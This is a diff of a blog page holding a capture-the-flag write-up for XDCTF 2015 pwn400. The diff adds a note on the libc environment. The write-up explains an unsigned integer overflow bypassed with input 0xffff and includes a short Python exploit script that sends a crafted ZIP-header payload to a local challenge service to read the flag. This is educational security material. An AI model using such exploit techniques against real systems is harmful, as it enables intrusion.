@@ -84,26 +84,35 @@
 
 
 
-<meta name="description" content="Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
+<meta name="description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
 
 v13+2不能过大，但是这里如果输入0xffff就会溢出，即可绕过判断
-Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      = zio(target, print_read = False, print_write = False,">
+Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      =">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xdctf-qual-2015-pwn400">
 <meta property="og:url" content="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn400/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
+<meta property="og:description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
 
 v13+2不能过大，但是这里如果输入0xffff就会溢出，即可绕过判断
-Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      = zio(target, print_read = False, print_write = False,">
+Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      =">
 <meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn400/1.jpg">
-<meta property="og:updated_time" content="2016-08-19T07:52:32.000Z">
+<meta property="og:updated_time" content="2016-08-24T07:45:37.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xdctf-qual-2015-pwn400">
-<meta name="twitter:description" content="Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
+<meta name="twitter:description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Conclusion代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试
 
 v13+2不能过大，但是这里如果输入0xffff就会溢出，即可绕过判断
-Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      = zio(target, print_read = False, print_write = False,">
+Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      =">
 
 
 
@@ -372,7 +381,10 @@ Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      = zio(target, pri
       
 
       
-        <h2 id="Conclusion">Conclusion</h2><p>代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试</p>
+        <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h2 id="Conclusion">Conclusion</h2><p>代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试</p>
 <p><img src="/images/xdctf-qual-2015-pwn400/1.jpg" alt=""></p>
 <p><code>v13+2</code>不能过大，但是这里如果输入<code>0xffff</code>就会溢出，即可绕过判断</p>
 <h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = (<span class="string">'0'</span>, <span class="number">8888</span>)</span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'PK\x01\x02'</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload += l32(<span class="number">0xffff</span>)</span><br><span class="line">payload += <span class="string">'B'</span> * <span class="number">14</span></span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">'C'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">'f'</span>)</span><br><span class="line">flag = <span class="string">'f'</span> + io.read_until(<span class="string">'&#125;'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
@@ -552,7 +564,7 @@ Exploitfrom zio import *target  = (&apos;0&apos;, 8888)io      = zio(target, pri
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
